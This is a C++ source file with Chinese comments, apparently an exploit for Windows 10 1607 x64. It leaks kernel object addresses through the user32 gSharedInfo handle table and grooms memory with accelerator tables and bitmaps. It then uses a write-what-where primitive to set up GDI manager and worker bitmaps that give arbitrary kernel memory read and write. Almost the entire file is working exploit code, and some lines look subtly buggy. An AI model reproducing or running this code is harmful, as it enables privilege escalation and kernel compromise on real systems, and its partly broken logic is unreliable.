#include "bypass.h"

LeakBitmapInfo managerBitmap = {};
LeakBitmapInfo workerBitmap = {};

/*
* 借助于现在的逻辑, 完成我们剩下部分的利用
* 也就是构造出读写权限
*/
VOID bypassWithWindows10_1607_x64()
{
	// 提供两个bitmap变量, 进行利用
	// 貌似这个地方只要有了任意地址读写....
	// 就可以进行任意地址读写了....?????
	// 牛逼呀


	managerBitmap = leakBitmapAddress();
	workerBitmap = leakBitmapAddress();
	//managerBitmap = GDIReloaded();
	//workerBitmap = GDIReloaded();
	// 已经获取了读写的权限之后
	// 将manager.pvScan改为&worker.pvScan
	// 我觉得混着写好累呀, 不如把他们分开获取
	

	// &(managerBitmap.pvScan)获取地址
	DWORD64 managerPvScanAddress = (DWORD64)managerBitmap.pBitmapPvScan0;

	std::cout << "[+] wirte is : " << std::hex << managerPvScanAddress << std::endl;

	// &(workerBitmap.pvScan)获取地址
	DWORD64 workerPvScanAddress = (DWORD64)workerBitmap.pBitmapPvScan0;
	std::cout << "[+] what is: " << std::hex << workerPvScanAddress << std::endl;
	// 准备OK
	write_what_where_qword(managerPvScanAddress, workerPvScanAddress);
	// ok
}

/*
* readOOB:
*	[+] 对任意地址进行读操作
*	[+] whereRead: 读的地址
*	[+] whatValue: 获取读的值
*	[+] len: 读的长度(BYTE)
*/
VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(managerBitmap.hBitmap, len, &whereRead);	// 改变任意地址
	GetBitmapBits(workerBitmap.hBitmap, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(managerBitmap.hBitmap, len, &whereWrite);
	SetBitmapBits(workerBitmap.hBitmap, len, &whatValue);	// 写
}

/*
* leakBitmapAddress:
*	[+] 泄露bitmap地址
*	[+] 来源: 一会添上去
*/
LeakBitmapInfo leakBitmapAddress()
{
	UINT loadCount = 0;
	HACCEL hAccel = NULL;	// 用来重定位的句柄
	LPACCEL lPaccel = NULL;
	int keyParam = 700;
	int handleIndex = 0;
	PUSER_HANDLE_ENTRY firstEntryAddr = NULL;
	PUSER_HANDLE_ENTRY secondEntryAddr = NULL;

	PUCHAR firstAccelKernelAddr;
	PUCHAR secondAccelKernelAddr;

	PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle("user32.dll"), "gSharedInfo");	// 获取gSharedInfo表
	PUSER_HANDLE_ENTRY gHandleTable = pfindSharedInfo->aheList;		// 此处为数组, 存放相关的句柄信息

	LeakBitmapInfo retBitmap = {};

	lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * keyParam);		// 这个地方很重要

	while (loadCount < 20)	// 定位的次数
	{
		hAccel = CreateAcceleratorTable(lPaccel, keyParam);	// 分配一个变量, 第二个参数很重要

															// 用gHadnleTable获取当前对象的地址
															// 根据handle的算法算出在句柄表中的index
		handleIndex = LOWORD(hAccel);

		// 获取她在句柄表的哪个位置
		firstEntryAddr = &gHandleTable[handleIndex];

		// 获取其在内核中的地址

		firstAccelKernelAddr = (PUCHAR)firstEntryAddr->pKernel;
		DestroyAcceleratorTable(hAccel);

		hAccel = CreateAcceleratorTable(lPaccel, keyParam);	// 分配一个变量, 第二个参数很重要

															// 用gHadnleTable获取当前对象的地址
															// 根据handle的算法算出在句柄表中的index
		handleIndex = LOWORD(hAccel);

		// 获取她在句柄表的哪个位置
		secondEntryAddr = &gHandleTable[handleIndex];

		// 获取其在内核中的地址

		secondAccelKernelAddr = (PUCHAR)firstEntryAddr->pKernel;

		// 比较两个值是否相等
		// 找到说明可以预测下一次的分配
		if (firstAccelKernelAddr == secondAccelKernelAddr)
		{
			DestroyAcceleratorTable(hAccel);	// 去掉空间
			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);	// 不知道这个地方有没有什么诡异的点
			retBitmap.hBitmap = CreateBitmap(0x701 , 2, 1, 8, lpBuf);		// 这个地方我可以理解为堆喷
																					//SetBitmapBits(retBitmap.hBitmap, 5, "AAAA");
			break;
		}
		DestroyAcceleratorTable(hAccel);
		loadCount++;
	}

	retBitmap.pBitmapPvScan0 = firstAccelKernelAddr + 0x50;


	wprintf(L"[+] bitmap handle is:  0x%08x \n", (ULONG)retBitmap.hBitmap);
	wprintf(L"[+] bitmap pvScan0 at: 0x%p \n\n", retBitmap.pBitmapPvScan0);

	return retBitmap;
}